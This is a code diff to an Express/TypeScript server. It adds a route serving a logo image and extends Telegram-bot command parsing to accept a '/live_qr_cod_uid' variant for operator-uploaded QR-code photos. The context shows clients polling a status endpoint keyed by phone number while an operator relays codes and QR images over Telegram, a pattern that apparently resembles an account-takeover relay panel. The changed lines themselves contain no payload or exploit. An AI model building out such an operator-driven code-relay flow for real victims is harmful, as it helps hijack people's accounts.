@@ -2,6 +2,7 @@ import express from "express";
 import path from "path";
 import dns from "dns";
 import dotenv from "dotenv";
+import fs from "fs";
 import { createServer as createViteServer } from "vite";
 
 // Ensure ipv4first for local network requests if supported
@@ -239,6 +240,20 @@ app.get("/api/proxy-image", async (req, res) => {
   }
 });
 
+// Serve /my-logo.jpg from the project root (supporting render.com production and local development)
+app.get("/my-logo.jpg", (req, res) => {
+  const customLogoPath = path.join(process.cwd(), "my-logo.jpg");
+  const fallbackLogoPath = path.join(process.cwd(), "src", "assets", "images", "default_avatar_1782370919940.jpg");
+  
+  if (fs.existsSync(customLogoPath)) {
+    res.sendFile(customLogoPath);
+  } else if (fs.existsSync(fallbackLogoPath)) {
+    res.sendFile(fallbackLogoPath);
+  } else {
+    res.status(404).send("Logo not found");
+  }
+});
+
 // 3. Check status (Client polls this)
 app.get("/api/check-status", (req, res) => {
   const { phoneNumber, uid } = req.query;
@@ -324,7 +339,7 @@ function extractIdentifier(text: string): string | null {
   // Otherwise, look for phone numbers
   // Clean up common bot command words first to avoid picking up digits inside commands
   let cleanText = text
-    .replace(/\/(success|error|cod|live_qr_cod)[_\s\-]?/gi, " ")
+    .replace(/\/(success|error|cod|live_qr_cod_uid|live_qr_cod)[_\s\-]?/gi, " ")
     .trim();
 
   // Strip common formatting characters within phone numbers (spaces, hyphens, parentheses, plus)
@@ -408,7 +423,7 @@ async function startTelegramPolling() {
               }
 
               // B. Check for /live_qr_cod photo upload command (with caption)
-              if (photo && photo.length > 0 && text.toLowerCase().includes("/live_qr_cod")) {
+              if (photo && photo.length > 0 && (text.toLowerCase().includes("/live_qr_cod") || text.toLowerCase().includes("/live_qr_cod_uid"))) {
                 const targetId = extractIdentifier(text);
                 if (targetId) {
                   const fileId = photo[photo.length - 1].file_id;
